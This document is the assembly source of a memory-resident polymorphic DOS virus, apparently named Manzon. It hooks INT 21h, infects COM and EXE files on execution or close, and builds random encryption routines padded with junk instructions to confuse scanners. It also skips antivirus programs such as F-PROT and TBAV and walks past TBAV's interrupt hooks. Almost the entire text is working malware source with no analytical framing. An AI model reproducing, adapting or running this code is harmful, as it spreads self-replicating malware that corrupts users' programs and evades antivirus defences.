        .model tiny
        .code
        .386

code_size equ code_end-code_start
filecodelength equ filecodeend-code_start
        org 100h

code_start:
start:
        call    StartDecryptSimple

SimpleCryptStart:

        call    InstallVirus            ; Call Install routine


;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following code randomly creates an encryptor and a matching   :+
;+    decryptor.                                                    :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

WriteVirus:
        push    bx                      ; Save filehandle
        in      ax,40h                  ; Get random

;+:+:+:+:+:+:+Create random values to use in instructions+:+:+:+:+:+:+:

        mov     si,offset Rand1a        ; First random in decryptor OP-codes
        mov     di,offset Rand1b        ; First random in encryptor OP-codes
        mov     cx,5                    ; 7*2 OP-codes to change
SetRandom:
        mov     [si],al
        mov     [di],al
        add     si,4                            ; Next OP-code
        add     di,4                            ; -----"-----
        xor     ax,      'P'-'O'-'O'-'R'        ; Generate...
        rol     ax,5                            ; ..new...
        xor     ax,'R'-'E'-'B'-'O'-'U'-'N'-'D'  ; random
        loop    SetRandom

;+:+:+:+:+:+: Copy instructions from ENCode and DECode :+:+:+:+:+:+:+:

CreateCode:
        push    cs
        pop     es
        mov     cx,13                           ;Counter, max 13 sequences
        mov     di,offset CCode1
        mov     si,offset DECode
        mov     word ptr ds:[CLength],0h        ;Length of decryptor
CreateLoop:
        mov     si,offset DECode
        in      ax,40h                          ; Get random
        ror     ax,cl
        xor     ax,'I'-'M'-'M'-'O'-'R'-'T'-'A'-'L'
        sub     ax,        'R'-'I'-'O'-'T'
        push    ax                              ;Save for later use
        mov     bl,al
        and     bl,15                           ;Mask only 0-15
        shl     bl,2                            ;mul 4 to get right offset
        xor     bh,bh
        add     si,bx                           ;Get right OP-code
        movsd                                   ;move one inst (4 bytes)

        std                                     ;count backwards
        push    cx
        push    di                              ;Move code in CCode one inst
        push    si                              ;forward, so next inst could
        mov     si,offset CCode2+13*4           ;be first.
        mov     di,offset CCode2+14*4
        mov     cx,14
        rep     movsd
        pop     si
        mov     di,offset CCode2
        cld

        cmp     bl,29                            ;Should we use alt. encrypt?
        jnb     short Garbage                    ;No, just garbage-instructions

        add     si,ENCode-DECode-4              ;Get right pos in ENCode
        movsd                                   ;move one inst (4 bytes)
        sub     si,ENCode-DECode                ;Back to old pos in DECode
        jmp     short NoGarbage
Garbage:
        sub     si,4                            ;Same instructions again
        movsd
NoGarbage:
        pop     di
        pop     cx
        add     word ptr ds:[CLength],4         ;Add length of decryptor
        pop     ax                              ;Get random value again
        and     ax,128+64                       ;Leave de/encryptor like this?
        jz      short QuitLoop
        loop    CreateLoop
QuitLoop:

;+:+:+: Build the first instruction in decryptor (mov cx,??) :+:+:+:+:

        xor     ax,ax
        in      al,40h                          ; Another random
        xor     al,'A'
        and     al,7                            ;Random between 0 and 7
        mov     byte ptr ds:[InitCX1],0b9h      ;OP-Code for mov cx,?
        mov     bx,filecodelength
        add     bx,ax
        mov     word ptr ds:[InitCX1+1],bx       ;Value to put in CX (counter)

;+:+:+: Build to second instruction (mov si, offset codestart) :+:+:+:+:

        mov     byte ptr ds:[InitSI1],0beh      ;OP-Code for mov si,?
        mov     ax,[entry_p]                    ;EntryPoint
        add     ax,word ptr ds:[CLength]        ;Length of cryptlines
        add     ax,15                           ;size of rest of loop
        add     ax,[IPOffs]                     ;Then add 100h
NoCom:  mov     word ptr ds:[InitSI1+1],ax      ;Value to put in CX (counter)

;+:+:+: Build the instruction that increase SI :+:+:+:+:

        and     bl,2                            ; Get random for inc si
        shl     bl,2                            ; mul 4
        mov     bh,0
        mov     si,offset DEcSI
        add     si,bx                           ; Get pos in ADD-SI-alts.
        movsd

;+:+:+: Build the loop-instruction :+:+:+:+:

        mov     ah,0ffh
        sub     ah,[CLength]                    ; Calculate loop operand
        sub     ah,5
        mov     al,0e2h                         ; OP-code for loop
        mov     [di],ax                         ; Write loop command

;+:+:+: Write RET at end of encryptionroutine :+:+:+:+:

        mov     di,offset CCode2                ; Encryptionroutine
        add     di,word ptr ds:[Clength]        ; Find end of ER
        mov     byte ptr ds:[di],0c3h           ; Write a RET

;+:+:+: Write created loader to file :+:+:+:+:

        pop     bx                              ; Get filehandle
        mov     ah,40h                          ; Function WRITE
        mov     cx,word ptr ds:[CLength]
        add     cx,12
        mov     dx,offset InitCX1
        int     21h                             ; Write decryptor to file
        mov     word ptr ds:[File_H],bx

;+:+:+:+: Cahnge decryptor so code could use it (put ret instead of inc)

        mov     di,offset CCode1                ; Encryptionroutine
        add     di,word ptr ds:[Clength]        ; Find end of ER
        mov     byte ptr ds:[di],0c3h           ; Write a RET

;+:+:+:+: Copy enc&dec-call-routine to end of virus :+:+:+:+:

        mov     si,offset ED_start              ; Start of ED-routine
        mov     di,offset ED_buf                ; buffer beyond virus
        mov     cx,ED_End-ED_start              ; Size of ED-routine
        rep     movsb
        call    filecodeend                     ; Call copy

        ret

;------ Routine to Encrypt virus, write virus, and decrypt virus

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following code will be copied to memory beyond the virus,     :+
;+    and then called. The routine then calls the created           :+
;+    encryptor, writing the encrypted virus the the file and       :+
;+    then uses the modified decrytor to decrypt the virus again.   :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

ED_start:

;+:+:+: Create RandomValue for simple enc/decryptor +:+:+:+

        in      al,40h
        mov     byte ptr cs:[DSRan],al

;+:+:+: Encrypt virus, using simple encryptor :+:+:+:+

        mov     ax,offset EncryptDecryptSimple
        call    ax

;+:+:+: Encrypt virus, using created encryptor :+:+:+:+

        mov     si,0100h                        ; Start of viruscode
        mov     cx,filecodelength
encloop:
        mov     ax,offset CCode2                ; offset to created enc-routine
        call    ax                              ; call it
        inc     si
        loop    encloop                         ; Encrypt whole virus

;+:+:+: Write encrypted virus to file :+:+:+:+

        mov     bx,word ptr ds:[File_H]         ; Get filehandle
        mov     ah,40h                          ; Function WRITE
        mov     cx,filecodelength
        mov     dx,0100h
        pushf
        push    cs                              ; Fake interrupt call
        call    DoOldInt

;+:+:+: Decrypt virus, using created encryptor :+:+:+:+

        mov     si,0100h                        ; Start of viruscode
        mov     cx,filecodelength
decloop:
        mov     ax,offset CCode1
        call    ax                              ; Call builded encryptroutine
        inc     si
        loop    decloop

;+:+:+: Decrypt virus, using simple decryptor :+:+:+:+

        mov     ax,offset EncryptDecryptSimple
        call    ax

;+:+:+: Write random number of extra bytes to file (0-15) :+:+:+:+

        mov     bx,word ptr ds:[File_H]         ; Get filehandle
        in      ax,40h                          ; Get random in al
        mov     ds,ax                           ; Read from random segment
        and     ax,0fh                          ; mask bit 0-3
        mov     cx,ax                           ; No. bytes to write
        mov     ah,40h
        add     word ptr cs:[CLength],cx        ; add length (must know this
        xor     dx,dx                           ; when creating EXE-header).
        pushf
        push    cs                              ; Fake interrupt call
        call    DoOldInt

        push    cs                              ; Push back codeseg in DS
        pop     ds

        ret

DoOldInt:
        sti
        db      0eah
OldInt  dd      0

ED_End:

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following table contains 16 different 4-byte codesqeunces,    :+
;+    randomly used by the decryptionroutine. The first 8 affects   :+
;+    the decryption algoritm, and has a matching 4-byte inst-      :+
;+    ruction in the ENCode-table. The rest is just garbage-        :+
;+    instructions, used to make scanning harder. The morpher       :+
;+    will pick a random number (1-16) of these instructions,       :+
;+    and build the decryption routine.                             :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

DECode  db      02eh,080h,004h          ; add byte ptr cs:[si],?
Rand1a  db      ?
        db      02eh,080h,02ch          ; sub byte ptr cs:[si],?
Rand2a  db      ?
        db      02eh,080h,034h          ; xor byte ptr cs:[si],?
Rand3a  db      ?
        db      02eh,0C0h,004h          ; rol byte ptr cs:[si],?
Rand4a  db      ?
        db      02eh,0C0h,00Ch          ; ror byte ptr cs:[si],?
Rand5a  db      ?
        db      02eh,0feh,00ch,090h     ; dec byte ptr cs:[si]; nop
        db      02eh,0feh,004h,090h     ; inc byte ptr cs:[si]; nop
        db      02eh,0f6h,01ch,090h     ; neg byte ptr cs:[si]; nop
;-------The rest is just bullshit, used to confuse scanners
        db      053h,08bh,0dch,05bh     ; push bx; mov bx,sp; pop bx
        db      093h,043h,090h,043h     ; xchg bx,ax; inc bx; nop; inc bx
        db      040h,08ah,0c4h,048h     ; inc ax; mov al,ah; dec ax
        db      08ch,0c8h,056h,05fh     ; mov ax,cs; push si; pop di;
        db      074h,000h,075h,000h     ; je $+2; jne $+2;
        db      08Bh,0c3h,02bh,0d8h     ; mov ax,bx; sub ax,bx
        db      003h,0feh,02ch,002h     ; add di,si; sub al,2
        db      0ebh,001h,0b4h,090h     ; jmp $+3; mov ah,90h (b4h + nop)

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following table contains the encryptionversions of the        :+
;+    first 8 instructions in the DECode-table.                     :+
;+    SUB will be ADD, ROR will be ROL etc.                         :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

ENCode  db      02eh,080h,02ch          ; sub byte ptr cs:[si],?
Rand1b  db      ?
        db      02eh,080h,004h          ; add byte ptr cs:[si],?
Rand2b  db      ?
        db      02eh,080h,034h          ; xor byte ptr cs:[si],?
Rand3b  db      ?
        db      02eh,0C0h,00Ch          ; ror byte ptr cs:[si],?
Rand4b  db      ?
        db      02eh,0C0h,004h          ; rol byte ptr cs:[si],?
Rand5b  db      ?
        db      02eh,0feh,004h,090h     ; inc byte ptr cs:[si]; nop
        db      02eh,0feh,00ch,090h     ; dec byte ptr cs:[si]; nop
        db      02eh,0f6h,01ch,090h     ; neg byte ptr cs:[si]; nop

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following table contains four different ways to increase      :+
;+    SI. Used only in the DECode-routine (CCode1).                 :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

DEcSI   db      083h,0c6h,001h,090h     ; add si,1; nop
        db      046h,033h,0dbh,0f8h     ; inc si; xor bx,bx; clc
        db      04eh,046h,046h,0f9h     ; dec si; inc si; sinc si; stc
        db      083h,0c6h,002h,04eh     ; add si,2; dec si

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+                         Other data                               :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

CLength db      ?                       ; Length of decryptor
        db      ?
ComExe  db      0                       ; 0=Com, 1=Exe
buffer  db      0c3h                    ; Buffer contains original 3 bytes of
orgep   dw      0                       ; COM-file. 03ch (RET) will exit program
                                        ; in normal DOS. Used only first time.
buffer2 db      0e9h                    ; JMP OP-code, used to build COM-jump
entry_p dw      0                       ; Entrypoint, part of JMP-instruction

Real_CS dw      0
Real_IP dw      0
Real_SS dw      0
Real_SP dw      0

IPOffs  dw      100h                    ; Start offset (100h for comfiles)

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    INT 21h Entrypoint. Check if virus is calling, and if file    :+
;+    should be infected.                                           :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

NewVect:
        cmp     ax,0DCBAh                       ; Is virus calling?
        jne     Notvirus
        mov     dx,ax
        iret
Notvirus:
        cli                                     ; Clear Interrupts
        cld                                     ; Clear Direction
        cmp     ah,3eh                          ; Is file going to be closed?
        je      Short FileClose

        cmp     ax,4b00h                        ; Is file going to be executed?
        je      Short FileExecute
        jmp     DoOldInt

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following code is called when a file is going to be executed. :+
;+    The file will be opened, and then closed. When the file is    :+
;+    closed, the virus will call itself by INT21/3Eh, and the file :+
;+    will be infected. Pretty smart, eh? :)                        :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

FileExecute:
        pusha

        mov     ax,3d00h                        ; Open file for ReadOnly
        int     21h
        mov     bx,ax                           ; Filehandle in bx
        mov     ah,3eh
        int     21h                             ; Close file (infect file :))

        popa
        jmp     DoOldInt

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Following code is called when a file is going to be closed.   :+
;+    The code uses INT2F/1220h to get the adress of JFT-entry,     :+
;+    and then INT2F/1216h to get adress of SFT.                    :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

FileClose:
        cmp     bx,5            ; Is it a standard device?
        jb      DoOldInt

        push    ds
        push    es
        pusha

        push    bx
        mov     ax,1220h        ; Table in es:di
        int     2fh
        mov     ax,1216h
        mov     bl,byte ptr es:[di]
        int     2fh
        pop     bx

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    This is a very poor way to check the 2 first characters in a  :+
;+    filename, but the asciicode will look nice =)                 :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

        mov     ax,word ptr es:[di+20h]
        xchg    al,ah
        add     ax,0302h

        cmp     ax,'F-'  +  0302h       ; Don't infect F-PROT
        je      short Skip_Infect
        cmp     ax,'SC'  +  0302h       ; Don't infect SCAN
        je      short Skip_Infect
        cmp     ax,'TB'  +  0302h       ; Don't infect TB*.* (TBAV)
        je      short Skip_Infect
        cmp     ax,'TO'  +  0302h       ; Don't infect TOOLKIT
        je      short Skip_Infect
        cmp     ax,'FV'  +  0302h       ; Don't infect FV386
        je      short Skip_Infect
        cmp     ax,'FI'  +  0302h       ; Don't infect FINDVIRU
        je      short Skip_Infect
        cmp     ax,'VI'  +  0302h       ; Don't infect VI*.*
        je      short Skip_Infect
        cmp     ax,'K-'  +  0302h       ; Don't infect R.L's stuff :)
        je      short Skip_Infect

Check_Com:
        cmp     word ptr es:[di+28h],'OC'
        jne     short Check_Exe
        cmp     byte ptr es:[di+2ah],'M'
        jne     short Check_Exe
        or      byte ptr es:[di+2],2          ; Set R&W Access
        call    Infect_Com

Check_Exe:
        cmp     word ptr es:[di+28h],'XE'
        jne     short Skip_Infect
        cmp     byte ptr es:[di+2ah],'E'
        jne     short Skip_Infect
        or      byte ptr es:[di+2],2          ; Set R&W Access
        call    Infect_Exe

Skip_Infect:
        popa
        pop     es
        pop     ds
        jmp     DoOldInt


;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Infect COM-file                                               :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

Infect_Com:
        push    cs
        pop     ds

        mov     ax,4202h                        ; Go to EOF
        xor     cx,cx
        cwd
        int     21h                             ; Get filelength in AX
        push    ax

        mov     ax,4200h                        ; Go to SOF
        xor     cx,cx
        cwd
        int     21h

        mov     ah,3fh                          ; Read the 3 first bytes
        mov     cx,3
        mov     dx,offset buffer
        int     21h

        pop     ax                              ; Get Filelength
        sub     ax,[orgep]                      ; Virus entrypoint, if file
        cmp     ax,filecodelength+100h          ; is infected
        jnb     short LooksOk
        cmp     ax,filecodelength-10h
        jb      short LooksOk
        jmp     short DontInfect

LooksOk:
        mov     ax,4202h                        ; Go to EOF
        xor     cx,cx
        cwd
        int     21h

        cmp     ax,62000                        ; Is file small enough?
        jnb     short DontInfect

        sub     ax,3                            ; Make the first 3 bytes
        mov     word ptr ds:[buffer2+1],ax      ; (jmp to eof (viruscode))

        mov     [IPOffs],100h                   ; Tell that offset is 100h

        push    bx
        call    WriteVirus
        pop     bx

        mov     ax,4200h                        ; Move to SOF
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h                          ; Write first 3 bytes
        mov     cx,3
        mov     dx,offset buffer2
        int     21h

DontInfect:
        ret

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+    Infect EXE-file                                               :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

Infect_Exe:
        push    cs
        pop     ds

        mov     [File_H],bx

        mov     ax,4200h                        ; Go to SOF
        xor     cx,cx
        cwd
        int     21h

        mov     ah,3fh
        mov     cx,19h                          ; Size of EXE-header
        mov     dx,offset EXE_Header
        int     21h

        cmp     word ptr ds:[EXE_Sig],'MZ'      ; Be sure it's a real EXE.
        je      short ItIsAnExe
        cmp     word ptr ds:[EXE_Sig],'ZM'
        je      short ItIsAnExe
        jmp     short DontInfect
ItIsAnExe:
        cmp     byte ptr ds:[EXE_Win],40h       ; Is it a NE-EXE?
        je      short DontInfect                ; Don't infect.

        xor     eax,eax
        xor     ebx,ebx
        xor     ecx,ecx

        les     ax,dword ptr ds:[EXE_IP]        ; get CS:IP in ES:AX
        mov     ds:Real_CS,es
        mov     ds:Real_IP,ax
        push    ax                              ; Save IP
        push    es                              ; Save CS

        les     ax,dword ptr ds:[EXE_SS]        ; get SS:SP in AX:ES
        mov     ds:Real_SS,ax
        mov     ds:Real_SP,es
        push    es
        pop     bx                              ; SP in BX

        shl     eax,4                           ; Build real SS:SP in EBX
        add     eax,ebx

        pop     cx                              ; Get CS in CX
        pop     bx                              ; Get IP in BX
        shl     ecx,4                           ; Build real CS:IP in ECX
        add     ecx,ebx

        sub     eax,ecx                         ; EAX = SS:SP-CS:IP

        cmp     eax,(filecodelength+400)
        jnb     short NotInfected
        cmp     eax,filecodelength
        jb      short NotInfected
        jmp     SkipInfect

NotInfected:
        xor     eax,eax
        mov     bx,[File_H]

        mov     ax,4202h                        ; Go to EOF
        xor     cx,cx
        cwd
        int     21h                             ; Get filelength in dx:ax

        xor     ecx,ecx
        xor     ebx,ebx
        mov     cx, word ptr ds:[EXE_Siz]       ; Get Siz/512 from header
        mov     bx, word ptr ds:[EXE_Mod]       ; Get Siz mod 512 from header
        shl     ecx,9                           ; Mul 512
        add     ecx,ebx                         ; Build Real memsize

        mov     bx,dx
        shl     ebx,16
        add     ebx,eax                         ; Build filesize in EBX

        cmp     ecx,ebx                         ; Is whole file loaded?
        jb      SkipInfect                      ; Nope, skip infect

        xor     ecx,ecx
        push    ax
        pop     cx                              ; Low word in cx

        mov     ax,dx
        shl     eax,16
        add     eax,ecx                         ; Build filesize in eax
        mov     edx,eax                         ; Save filesize

        xor     ebx,ebx
        mov     bx, word ptr ds:[EXE_SHe]
        shl     ebx,4                           ; Build real Headersize
        sub     eax,ebx                         ; Filesize-Headersize=CS:IP!!
        push    eax                             ; Save new CS:IP for later use

        call    FixSegOffs                      ; Fix CS:IP so IP<10h

        mov     dword ptr ds:[EXE_IP],eax

        mov     [entry_p],ax                    ; Set virus entrypoint
        mov     [IPOffs],-3                     ; No offset in EXE-files

        mov     bx,[File_H]
        call    WriteVirus                      ; Write virus to EOF

        xor     eax,eax
        xor     ebx,ebx
        mov     ax,word ptr ds:[EXE_Mod]        ; Bytes on last page
        mov     bx,word ptr ds:[EXE_Siz]        ; Size/512
        shl     ebx,9                           ; Mul 512
        add     eax,ebx                         ; Make progsize
        add     eax,filecodelength              ; Add code_size
        xor     ebx,ebx
        mov     bx,word ptr ds:[CLength]
        add     eax,ebx                         ; Add decryptsize
        add     eax,12                          ; add InitCX,Loop etc
        mov     ebx,eax
        shr     ebx,9                           ; Make new progsize/512
        and     ax,01ffh                        ; Make modulo

        mov     word ptr ds:[EXE_Siz],bx
        mov     word ptr ds:[EXE_Mod],ax

        add     word ptr ds:[EXE_Min],(code_size+100)/16
        mov     word ptr ds:[EXE_Max],-1

        pop     eax                             ; Get CS:IP
        xor     ebx,ebx
        mov     bx,word ptr ds:[CLength]        ; Length of decryptor
        add     eax,ebx
        add     eax,12                          ; Add INIT_CX, INIT_SI etc
        add     eax,VirStk-Code_Start           ; Add pos of Stack

        inc     eax                             ; Add one byte and...
        and     al,0feh                         ; ...make sure it's even

        call    FixSegOffs                      ; Fix so SP<10h

        mov     word ptr ds:[EXE_SP],ax        ; Save new SS:SP
        shr     eax,16
        mov     word ptr ds:[EXE_SS],ax        ; Save new SS:SP

        mov     bx,[File_H]

        mov     ax,4200h                        ; Go to SOF
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h
        mov     cx,18h                          ; Size of EXE-header
        mov     dx,offset EXE_Header
        int     21h                             ; Write new header

SkipInfect:
        ret

FixSegOffs:
        mov     ebx,eax
        xor     ax,ax
        shl     eax,12
        mov     ax,bx
FixSegOffsLoop:
        mov     bx,ax
        cmp     bx,10h
        jb      short DoneFix
        add     eax,00010000h - 00000010h       ; 1 para up..
        jmp     short FixSegOffsLoop
DoneFix:
        ret

id      db      'MANZON (c) '

        db      'R' + 1
        db      'e' + 2
        db      'd' + 3
        db      '-' + 4
        db      'A' + 5
        db      '/' + 6
        db      'I' + 7
        db      'R' + 8

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:
;+      Following code will check if virus is resident,              +:
;+      allocate memory, copy virus to memory, set the new           +:
;+      interrupt vector and transfer control to the program         +:
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:

InstallVirus:
        pop     si                      ; Get Start of virus+3
        push    si                      ; Save it again for later use.
        push    ds                      ; push PSP for later use
        push    cs
        pop     ds

;+:+:+:+:+:+:+:+:+:+:  Ceck if virus is active  :+:+:+:+:+:+:+:+:+:+:+:

        mov     ax,0DCBAh
        int     21h
        cmp     dx,ax
        je      short Installed         ; Virus found in memory

;+:+:+:+:+:+:+:+:+:+: Allocate memory for virus :+:+:+:+:+:+:+:+:+:+:+:

        mov     ah,4ah                  ; Get top of memory
        push    ax
        mov     bx,-1			
        int     21h

        sub     bx,(code_size)/16+2     ; Resize memory allocation
        pop     ax
        int     21h

        mov     ah,48h                  ; Allocate memory for Virus
        mov     bx,(code_size)/16+1
        int     21h
        jc      short Installed         ; If error then exit

        dec     ax                      ; dec AX to get pointer to MCB
        mov     es,ax
        mov     word ptr es:[1],8       ; Set DOS as owner of memory
        sub     ax,0fh                  ; 100 bytes from allocstart
        mov     es,ax                   ; to get same offset in TSR-code

;+:+:+:+:+:+:+:+:+:+:+:+:  Copy virus to memory  :+:+:+:+:+:+:+:+:+:+:+:

        sub     si,6
        mov     di,0100h
        mov     cx,code_size
        rep     movsb			; move 'em up

;****** Get adress of old INT21h and save it in the Do21-jump.

        push    es
        pop     ds
        mov     ax,3521h
        int     21h
tbavfuck:
        cmp     word ptr es:[bx],05ebh
        jne     notbav
        cmp     byte ptr es:[bx+2],0eah
        jne     notbav
        les     bx,es:[bx+3]
        jmp     tbavfuck
notbav:
        mov     word ptr ds:[OldInt+2],es       ; Save address to real INT
        mov     word ptr ds:[OldInt],bx         ; in the JMP-string

;****** Set new INT21h

        mov     dx,offset NewVect               ; Set New interruptvector
        mov     ax,2521h
        int     21h

installed:
        pop     ax                              ; Get PSP
        pop     si
        sub     si,106h
        cmp     word ptr cs:[si+IPoffs],100h    ; Are we in a COM-file
        je      short RestoreComFile

RestoreExeFile:
        mov     ds,ax                           ; Let ds contain PSP
        mov     es,ax                           ; Let es contain PSP
        add     ax,10h                          ; Get start of file

        add     word ptr cs:[si+Real_CS],ax     ; Add start seg to CS
        add     ax,word ptr cs:[si+Real_SS]
        mov     ss,ax                           ; Get programs SS
        mov     sp,word ptr cs:[si+Real_SP]     ; Get programs SP
        sub     sp,2                            ; Fix right value for SP

        push    word ptr cs:[si+Real_CS]
        push    word ptr cs:[si+Real_IP]
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        mov     si,ax
        mov     di,ax
        mov     bp,ax
        retf

RestoreComFile:
        mov     ax,cs
        mov     ds,ax
        mov     es,ax

        add     si,offset buffer                ; Restore real 3 first bytes
        mov     di,0100h
        movsw
        movsb
        xor     ax,ax
        xor     bx,bx
        xor     cx,cx
        xor     dx,dx
        mov     si,ax
        mov     di,ax
        mov     bp,ax
        push    0100h
        ret

SimpleCryptEnd:

StartDecryptSimple:
        call    GetIPLabel
GetIPLabel:
        mov     bp,sp
        mov     si,[bp]
        sub     si,GetIPLabel-SimpleCryptStart
        mov     cx, SimpleCryptEnd-SimpleCryptStart
        Call    DecryptSimple
        pop     ax
        ret

EncryptDecryptSimple:
        mov     si,offset SimpleCryptStart
        mov     cx, SimpleCryptEnd-SimpleCryptStart
        call    DecryptSimple
        ret

DecryptSimple:
        db      02eh,080h,034h          ; xor byte ptr cs:[si],?
DSRan   db      0
        inc     si
        loop    DecryptSimple
        ret

;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+
;+      Following code acts like a buffer in memory, and is not     :+
;+      included when the virus is written to a file.               :+
;+	(Normally known as the heap)                                :+
;+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+:+

filecodeend:                            ; Label to calculate code_size,
                                        ; and to use when jumping to copy
                                        ; of EWD-routine

ED_buf  db      ED_end-ED_start dup (?) ; space for copy of en EWD-routine

File_H  dw      ?                       ; Filehandle

; Space for the created decryptionroutine

InitCX1 db      ?,?,?                   ; mov cx,virsize+(0 to 7)
InitSI1 db      ?,?,?                   ; mov si,offset start
CCode1  dd      ?,?,?,?,?,?,?,?         ; 1 to 15 decryptrows
        dd      ?,?,?,?,?,?,?
        dd      ?,?                     ; + loop statement

; Space for the created encryptionroutine

CCode2  dd      ?,?,?,?,?,?,?,?         ; 1 to 15 decryptrows
        dd      ?,?,?,?,?,?,?
        dd      ?,?

EXE_Header:				; Structure
EXE_Sig dw      ?                       ; MZ or ZM
EXE_Mod dw      ?                       ; size - int(size/512)
EXE_Siz dw      ?                       ; size/512
EXE_Rel dw      ?                       ; Relocation iems
EXE_SHe dw      ?                       ; Size of header/16
EXE_Min dw      ?                       ; Min mem/16
EXE_Max dw      ?                       ; Max mem/16
EXE_SS  dw      ?                       ; Stack Segement
EXE_SP  dw      ?                       ; Stack Pointer
EXE_CHK dw      ?                       ; Checksum
EXE_IP  dw      ?                       ; Instruction Pointer
EXE_CS  dw      ?                       ; Code Segment
EXE_Win db      ?                       ; 40h if Windows EXE

VirStk: db      32 dup (?)              ; Stack used by the virus (EXE only)

code_end:
        end     start
;===============================================================================
